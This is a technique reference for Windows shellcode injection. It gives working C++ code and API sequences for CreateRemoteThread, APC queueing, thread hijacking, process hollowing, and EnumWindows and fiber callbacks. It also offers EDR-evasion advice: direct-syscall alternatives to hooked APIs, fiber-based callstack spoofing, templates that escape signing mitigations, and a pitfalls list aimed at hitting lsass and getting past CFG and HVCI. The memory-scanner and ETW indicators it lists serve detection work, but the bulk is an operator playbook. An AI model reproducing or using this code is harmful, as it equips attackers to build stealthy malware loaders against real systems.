# Shellcode Injection on Windows — Technique Reference

Basis: Windows 11 24H2 (build 26100), Windows Server 2022 21H2 (20348), Windows 10 22H2 (19045). Verification on Windows Defender 4.18.x, MDE, CrowdStrike Falcon 7.20, SentinelOne 24.x.

---

## 0. Primitif Bersama

All techniques below share the allocation/write/protection primitives:

```cpp
// alokasi RW, tulis, lalu flip ke RX (hindari RWX)
LPVOID p = VirtualAllocEx(hProc, nullptr, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, p, sc, scLen, &written);
DWORD old;
VirtualProtectEx(hProc, p, scLen, PAGE_EXECUTE_READ, &old);
```

Alternative APIs often used to avoid hooks on the above trio:

| Primitive | Low-signal alternative | Notes |
|---|---|---|
| VirtualAllocEx | `NtAllocateVirtualMemory` (syscall langsung) | Hook userland dilewati |
| WriteProcessMemory | `NtWriteVirtualMemory`, or `MapViewOfFile2` on a section | |
| CreateRemoteThread | `RtlCreateUserThread`, `NtCreateThreadEx` | |
| VirtualProtectEx | `NtProtectVirtualMemory` | |

Common memory scanner artifacts for shellcode blocks: `PAGE_EXECUTE_READWRITE` or `PAGE_EXECUTE_READ` regions without file backing (private commit), size a round 4 KB–256 KB, high entropy, absent `MZ`/`PE` headers, pattern `fc 48 83 e4 f0` (common Beacon/CS prolog) or absent `4d 5a`.

## 1. CreateRemoteThread (Classic CRT)

**What is sent:** raw shellcode to the target's private region, execution via a new thread whose entry = shellcode address.

**API sequence:**
1. `OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, ...)`
2. `VirtualAllocEx(..., PAGE_READWRITE)`
3. `WriteProcessMemory`
4. `VirtualProtectEx(..., PAGE_EXECUTE_READ)`
5. `CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, &tid)`
6. `WaitForSingleObject` (opsional)

**Core code:**

```cpp
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
SIZE_T n = 0; DWORD old = 0;
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);
HANDLE t = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
WaitForSingleObject(t, INFINITE);
```

**Appears in memory scanner:**
- Private `PAGE_EXECUTE_READ` region, size a round 4 KB (or page multiple with `MEM_COMMIT`), no `MappedFileName`.
- In ETW (`Microsoft-Windows-Kernel-Process`), `ThreadStart` event with `StartAddress` not inside any module (unbacked).
- ETW `Microsoft-Windows-Threat-Intelligence` (jika aktif) menandai `CreateRemoteThread` lintas-proses.
- Defender behavior rule `Behavior:Win32/RemoteThreadCreate` and MDE `SuspiciousRemoteThread`.

**Why it works:** this API is legal and used by debuggers/profilers; no OS restriction.
**Why it fails:** EDR hooks `CreateRemoteThread` at `kernel32!CreateRemoteThread` + `ntdll!NtCreateThreadEx`; cross-process to critical processes (lsass, csrss, services) is denied with `STATUS_ACCESS_DENIED` unless you have `SeDebugPrivilege` + PPL doesn't block. Post-Win11 22H2, PPL targets (lsass, MsMpEng) cannot be opened with `PROCESS_ALL_ACCESS`.

## 2. APC Queue Injection

**What is sent:** shellcode to the target region, then an APC is queued to the target thread; execution occurs when the thread enters an alertable wait (`SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`).

**API sequence:**
1. `OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD, ...)`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx(PAGE_EXECUTE_READ)`
3. `OpenThread(THREAD_SET_CONTEXT, FALSE, tid)` — tid boleh lintas-proses
4. `QueueUserAPC((PAPCFUNC)p, hT, 0)`
5. Trigger: target calls `SleepEx(INFINITE, TRUE)` or `SignalObjectAndWait`

**Core code:**

```cpp
HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, FALSE, pid);
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
DWORD old; VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);

HANDLE ht = OpenThread(THREAD_SET_CONTEXT|THREAD_QUERY_INFORMATION, FALSE, tid);
QueueUserAPC((PAPCFUNC)p, ht, 0);
// target harus alertable; kalau tidak, APC tidak akan pernah jalan
```

**Appears in memory scanner:**
- Same as CRT: private RX region without file backing.
- ETW `Microsoft-Windows-Kernel-Process` — APC does not always trigger a new `ThreadStart`, so this technique is *quieter* in thread-start telemetry.
- Scanners that read the `KTHREAD` structure → `ApcState.ApcListHead[UserApcPending]` will see APC entries pointing to non-backed addresses. Only specialized tools (Volatility, kernel drivers) see this; userland scanners do not.
- Syscall trace (`nt!NtQueueApcThread`) — often hooked by EDR.

**Why it works:** APC does not create a new thread, is legitimately used by runtimes (.NET, PowerShell, RPC).
**Why it fails:** the target thread must be alertable — rare in modern processes. lsass, svchost, Winlogon are often not in an alertable state. The main thread of a GUI process (explorer) is usually alertable only in the message loop. Field practice: queue to many threads (one per TID) to increase probability.

## 3. Thread Hijacking (Suspend/GetContext/SetContext/Resume)

**What is sent:** shellcode as the target thread's RIP address; without creating a new thread.

**API sequence:**
1. `OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT, ...)`
2. `SuspendThread(hT)`
3. `GetThreadContext(hT, &ctx)` — `ctx.ContextFlags = CONTEXT_FULL`
4. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx(PAGE_EXECUTE_READ)`
5. `ctx.Rip = (DWORD64)p;` (x64) then `SetThreadContext(hT, &ctx)`
6. `ResumeThread(hT)`
7. Shellcode must be self-contained: after `ret`, the thread returns to the original address — the payload must save the original `ctx` and restore it (a good stager does this) or exit directly.

**Core code:**

```cpp
HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT,
                       FALSE, tid);
SuspendThread(ht);
CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(ht, &ctx);

HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, FALSE, pid);
LPVOID p = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(h, p, sc, scLen, &n);
DWORD old; VirtualProtectEx(h, p, scLen, PAGE_EXECUTE_READ, &old);

ctx.Rip = (DWORD64)p;
SetThreadContext(ht, &ctx);
ResumeThread(ht);
```

**Appears in memory scanner:**
- Region RX private.
- Thread RIP temporarily points to a non-module address — visible in `Get-Process | % Threads | % { $_.Id }` + ETW thread-profiling, or EDR thread walker.
- No `ThreadStart` event — only normal `ContextSwitch`, so creation-based telemetry does not trigger.
- Detection based on: `nt!NtSetContextThread` with `Rip` outside modules, or race-analysis on `SuspendThread` then `SetThreadContext` cross-process within <100 ms.

**Why it works:** context operations are legal, used by debuggers.
**Why it fails:** the thread may resume mid-instruction that is partially suspended on some CPU states; the payload must be stack-aligned (`and rsp, -16`). Suspending a thread holding a critical section can cause target deadlock. On Win11 24H2 with HVCI + KPTI active, cross-process `SetThreadContext` is still OK, but modern EDR hooks `NtGetContextThread`/`NtSetContextThread` in the kernel (the `PsSetCreateThreadNotifyRoutineEx` callback is not enough).

## 4. Process Hollowing (RunPE)

**What is sent:** a complete PE (often `svchost.exe`, `dllhost.exe`, `RuntimeBroker.exe` as template) with the `.text` section replaced by shellcode, mapped into a legitimate child process.

**API sequence:**
1. `CreateProcess(L"C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...)` — child suspended
2. `NtQueryInformationProcess(hChild, ProcessBasicInformation, &pbi, ...)` → ambil `PebBaseAddress`, `ImageBaseAddress`
3. `ReadProcessMemory(hChild, imageBase + 0x3C, ...)` → `e_lfanew` → `IMAGE_NT_HEADERS` → `SizeOfImage`
4. `NtUnmapViewOfSection(hChild, imageBase)` (or `NtUnmapViewOfSection` + `VirtualAllocEx` at imageBase)
5. `VirtualAllocEx(hChild, imageBase, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)`
6. `WriteProcessMemory` header + section `.text` (payload)
7. `SetThreadContext` → `Rcx = imageBase` (x64)
8. `ResumeThread`

**Core code (brief):**

```cpp
STARTUPINFOA si{}; PROCESS_INFORMATION pi{};
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

PROCESS_BASIC_INFORMATION pbi{};
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

// baca imageBase dari PEB -> baca NT header target -> SizeOfImage
LPVOID imageBase; SIZE_T rd;
ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, 8, &rd);
DWORD e_lfanew; ReadProcessMemory(pi.hProcess, (PBYTE)imageBase + 0x3C, &e_lfanew, 4, &rd);
DWORD sizeOfImage; ReadProcessMemory(pi.hProcess, (PBYTE)imageBase + e_lfanew + 0x50, &sizeOfImage, 4, &rd);

NtUnmapViewOfSection(pi.hProcess, imageBase);
LPVOID p = VirtualAllocEx(pi.hProcess, imageBase, sizeOfImage,
                          MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, p, newImage, newImageLen, &rd);

CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)p;                    // entry x64
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

**Appears in memory scanner:**
- **Key anomaly**: `MZ`/`PE` region in memory *does not match* the `MappedFileName` on disk. Enumerate `VirtualQueryEx` → compare `Type == MEM_IMAGE` vs header bytes.
- `MEM_PRIVATE` region at PEB `ImageBaseAddress` (not `MEM_IMAGE`) → most reliable detection.
- `PAGE_EXECUTE_READWRITE` at image base (classic hollowing with RWX) — easily detected; better version: split `.text` into RW then `VirtualProtectEx(PAGE_EXECUTE_READ)`.
- ETW `Microsoft-Windows-Kernel-Process/ImageLoad` on the child does not appear for the original image because `NtUnmapViewOfSection` occurs before the loader event.
- Carbon Black, MDE `Behavior:Win32/HollowedProcess.A`, SentinelOne `Hollowing` static engine.
- Post-Win10 1809, `NtUnmapViewOfSection` on an image base belonging to another process requires `PROCESS_VM_OPERATION` and on some builds raises audit event `Microsoft-Windows-Security-Auditing 4688` + empty child command line.

**Why it works:** legitimate child, legitimate image base, valid syscall.
**Why it fails:** CFG/CIG — processes with `ProcessSignaturePolicy: Microsoft Signed Only` refuse to map a section at an address from a non-MS image. On Win11 24H2, the default `MitigationOptions` for many services reject `CreateProcess` children with a hollowed image. WFP (Windows Defender Application Control) blocks `svchost.exe` with a signature mismatch during `ResumeThread`. PPL processes cannot be hollowed.

## 5a. Callback-Based — EnumWindows / EnumDesktopWindows

**What is delivered:** shellcode as a `WNDENUMPROC` callback; execution when `EnumWindows` calls our callback — in *our own* process, not remote. Remote variant: remote shellcode is proxied via `EnumWindows` in the target.

**In-process variant (most common):**

```cpp
typedef BOOL (WINAPI *WNDENUMPROC)(HWND, LPARAM);
// shellcode harus punya signature BOOL(HWND, LPARAM)
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(p, sc, scLen);
DWORD old; VirtualProtect(p, scLen, PAGE_EXECUTE_READ, &old);
EnumWindows((WNDENUMPROC)p, 0);            // langsung eksekusi
// atau: EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)p, 0);
// atau: EnumChildWindows, EnumPropsEx, EnumResourceTypes
```

**Remote variant:** shellcode is mapped into the target via remote mapping (`CreateFileMapping` + `MapViewOfFile2` in the target), then `EnumWindows` in the target is called via `CreateRemoteThread` to `EnumWindows(addr, 0)` — here the callback avoids hooks on `CreateRemoteThread` at the API address (hooks are often in `ntdll!NtCreateThreadEx`, still hit). More effective when combined with thread hijack.

**Appears in memory scanners:**
- Private RX region, but execution occurs **in-process** — often evades "cross-process injection" detection because there is no remote write/thread.
- `user32!EnumWindows` call in the call stack from a non-module address: visible in ETW sampling profiler (`Microsoft-Windows-Kernel-Process/ThreadStack`).
- `EnumWindows` with a callback outside `user32`/`comctl32` is a baseline anomaly in EDRs that hook `user32!EnumWindows` (rare — most vendors do not, so low signal).

**Why it works:** the callback is a legitimate contract; the OS does not validate that the callback address is in a module.
**Why it fails:** shellcode must be self-contained as `BOOL (HWND, LPARAM)` — the stager must keep a whitelist of window handles (usually check `lpParam == 0xCAFEBABE` or the first HWND, return TRUE) so it does not crash when called thousands of times. If the payload does not return `TRUE`, enumeration stops.

**Concrete product**: On Windows 11 24H2, `EnumWindows` from a non-interactive session (service session 0) against a non-default window station fails with `ERROR_INVALID_HANDLE` — the callback is never called. `SetProcessWindowStation`/`SetThreadDesktop` to the `WinSta0\Default` desktop or a process in a user session is required.

## 5b. Callback-Based — Fiber

**What is delivered:** shellcode in a new fiber context; execution via `SwitchToFiber`.

**API sequence:**
1. `ConvertThreadToFiber(NULL)` — the current process becomes a fiber
2. `pFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)p, NULL)` — entry = alamat shellcode
3. `SwitchToFiber(pFiber)`
4. Shellcode returns → `SwitchToFiber(fiberUtama)` to continue the process

**Core code:**

```cpp
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(p, sc, scLen);
DWORD old; VirtualProtect(p, scLen, PAGE_EXECUTE_READ, &old);

ConvertThreadToFiber(NULL);
LPVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)p, NULL);
SwitchToFiber(f);
```

**Remote variant:** remote shellcode is proxied with `CreateRemoteThread` to `ConvertThreadToFiber` + `CreateFiber` in the target — rarely practical; more often fibers are used as **CallStack evasion**: create a fiber with a fake `BaseThreadInitThunk` callback that calls the shellcode, so the callstack contains a legitimate `kernel32!BaseThreadInitThunk` → bypasses callstack-based detection (CrowdStrike, Elastic `Kernel32.BaseThreadInitThunk` heuristic).

**Callstack evasion — pola umum:**

```cpp
// fiber start routine:
VOID CALLBACK FakeStart(LPVOID) {
    // normalisasi callstack: shellcode dipanggil dari BaseThreadInitThunk
    typedef DWORD (WINAPI *PFN)(LPVOID);
    PFN f = (PFN)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");
    f(fn);
}
```

**Appears in memory scanners:**
- Region RX private (stager fiber).
- New fiber is registered in `PEB->FlsData`/`NtCurrentTeb()->HasFiberData`; kernel-mode scanners (Volatility, WinPmem) see a `FIBER` object with a non-module start address.
- Userland scanners generally **do not see** fibers as threads (a fiber is not a `KTHREAD`); this is why fibers are popular for evasion.
- `nt!NtCreateThreadEx` is not called, userland `CreateFiber` (in `kernel32!CreateFiber`) does not trigger ETW thread-start.

**Why it works:** a fiber does not create an OS thread; there is no `ThreadStart` event; the callstack can be spoofed.
**Why it fails:** the fiber must run on the thread that was `ConvertThreadToFiber`'d — if the shellcode is run on a thread different from the one that converted, `SwitchToFiber` returns `ERROR_INVALID_PARAMETER` (`0x57`) or causes an AV. On Windows 11 with `CFG` enabled, `CreateFiber` validates that the target is not illegitimately called indirectly — the `_guard_check_icall` function in the CRT `CreateFiberEx` blocks the shellcode address if the CFG bitmap does not mark it valid; workaround: call `SetProcessValidCallTargets` (requires `PAGE_TARGETS_INVALID`) or use `NtCreateThreadEx` with `CreateSuspended` then `SetThreadContext`.

## Final Section — Operational Pitfalls

1. **`PROCESS_ALL_ACCESS` is denied for PPL processes** (lsass, MsMpEng, csrss, services on Win11 22H2+). Granting `SeDebugPrivilege` via `AdjustTokenPrivileges` + opening `PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD` is required — often still `STATUS_ACCESS_DENIED` on PPL. Techniques that rely on lsass as a target (Mimikatz-style) are dead on Win11 24H2 unless there is a vuln.

2. **CFG (Control Flow Guard) blocks indirect calls to shellcode addresses**. In a CFG-enabled process, `CreateRemoteThread` to a non-valid address is rejected by the kernel (`STATUS_INVALID_IMAGE_FORMAT` or crash). Workaround: `SetProcessValidCallTargets` (after `VirtualProtectEx` with `PAGE_TARGETS_INVALID`), or use a CFG-disabled target process, or use `NtCreateThreadEx` with `CreateSuspended` + `SetThreadContext`.

3. **HVCI + VBS** on Win11 24H2 default: cross-process `VirtualProtectEx(PAGE_EXECUTE_READWRITE)` is denied for regions not yet `MEM_COMMIT` with a previous non-executable protection; cross-process RWX rarely succeeds. The **W→X** sequence (not RWX) is mandatory — and even that can be flagged by EDR monitoring `NtProtectVirtualMemory` with `NewProtect & (EXECUTE)` in cross-process private regions.

4. **Thread Hijack deadlock** if `SuspendThread` on a thread holding the loader lock (e.g., a thread currently in `LoadLibrary` in the target). Always check that `GetThreadContext` returns `STATUS_SUCCESS`, and pick a TID that is already sleeping (`WaitForSingleObject`/`Sleep`) — obtain it via `NtQuerySystemInformation` → `SYSTEM_PROCESS_INFORMATION.Threads[i].ThreadState == Waiting`.

5. **APC alertable state**. To hit lsass/svchost, you must find a thread in `SleepEx(INFINITE, TRUE)`/`SignalObjectAndWait`/`WaitForSingleObjectEx(..., TRUE)`. Task list enumeration is not enough; you need `NtQuerySystemInformation(SystemExtendedProcessInformation)` for `ThreadState == Waiting` + `WaitReason == UserRequest`/`WrQueue`. Field practice: queue to **all** TIDs of the target process; one of them is alertable.

6. **Process hollowing fails on a child with `MitigationOptions: ProcessSignaturePolicy` Microsoft Signed Only** (many Win11 services). `svchost.exe` with signed policy rejects `NtUnmapViewOfSection` of the image base and `WriteProcessMemory` to `.text`. Choose a non-mitigated template: `RuntimeBroker.exe`, `dllhost.exe`, or `werfault.exe` (note: some have already migrated to signed policy in 24H2).

7. **`EnumWindows` from session 0 service** (`svchost -k`) does not invoke the callback for user windows. You must `SetProcessWindowStation(OpenWindowStation("WinSta0"))` + `SetThreadDesktop(OpenDesktop("Default"))` *before* alloc; otherwise, `EnumWindows` returns TRUE without a callback.

8. **Fiber + CFG**: `CreateFiber` in the CRT performs `_guard_check_icall` — the shellcode address must be registered in the process CFG bitmap. Otherwise, `SwitchToFiber` crashes at `RtlUserFiberStart`. Solution: `SetProcessValidCallTargets` or use `CreateFiberEx` with `FIBER_FLAG_FLOAT_SWITCH` **does not** resolve CFG validation — a valid call target is still required.

9. **ETW Threat-Intelligence** (`Microsoft-Windows-Threat-Intelligence`) on Windows 11 24H2 26100 is enabled by default in many SKUs (Enterprise/Education). The events `KERNEL_THREATINT_TASK_ALLOCVM`, `..._PROTECTVM`, `..._WRITEVM`, `..._CREATETHREAD_REMOTE` all emit source PID and target PID — EDRs subscribed to this provider (MDE, CrowdStrike, SentinelOne) detect cross-process without needing userland hooks. There is no way to bypass this from userland; only direct syscalls + a signed driver can.

10. **`WriteProcessMemory` to a read-only `MEM_IMAGE` region**. On hardened targets (Chrome 131 renderer, Edge 131 with `--disable-features=RendererCodeIntegrity` off), `WriteProcessMemory` to `.text` returns `STATUS_PARTIAL_COPY` or `STATUS_ACCESS_DENIED` because the `PAGE_EXECUTE_READ` section is protected by `PAGE_TARGETS_NO_UPDATE` under VBS. Shellcode must go via a writable `NtMapViewOfSection` view — which itself can be flagged by `NtCreateSection` + `NtMapViewOfSection` cross-process.

11. **Handle leakage and PPL**: `OpenProcess` against `smss.exe`, `csrss.exe`, `services.exe` from a medium-IL user returns `ERROR_ACCESS_DENIED` (0x5). The runner must elevate to HIGH/System (via UAC bypass, `CreateProcessWithTokenW` with a SYSTEM token, or `ServiceCreate`). Otherwise, all the techniques above never reach the API — they fail at step 1.

12. **Crash-on-tamper**: `VirtualProtectEx` from `PAGE_READWRITE` → `PAGE_EXECUTE_READ` on a region that has **never** been executable in the upstream memory manager causes the CFG bitmap to **not** update automatically; the next execution triggers `STATUS_CONTROL_PROTECTION_VIOLATION` (0xC0000409) if CFG is strict. Always `SetProcessValidCallTargets(hProc, p, scLen, 1, &cfg)` after flipping protection in a CFG-strict process (Win11 default for many services).
